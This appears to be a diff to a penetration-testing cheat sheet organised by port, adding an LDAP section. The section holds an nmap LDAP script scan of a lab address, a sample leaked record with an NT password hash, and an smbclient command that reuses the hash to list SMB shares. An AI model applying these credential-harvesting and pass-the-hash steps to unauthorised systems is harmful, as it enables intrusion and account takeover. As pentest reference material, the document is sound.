@@ -36,9 +36,9 @@
     https://github.com/superkojiman/onetwopunch
 
 
+
 ## Tools for ports
 http://www.0daysecurity.com/penetration-testing/enumeration.html
-
 
 =============================================================
 ## 21: Ftp
@@ -349,6 +349,16 @@ Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hyperte
 ### Snmpwalk
     snmpwalk -c public -v1 192.168.168.168
 
+=============================================================
+## 389 : LDAP
+
+    nmap -p 389 --script *ldap* 10.10.10.107
+
+    Can leak Hash usables for SMB
+    uid: alice1978
+    objectClass: sambaSamAccount
+    sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
+    smbclient -L \\\\10.10.10.107 --pw-nt-hash -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B
 
 
 =============================================================
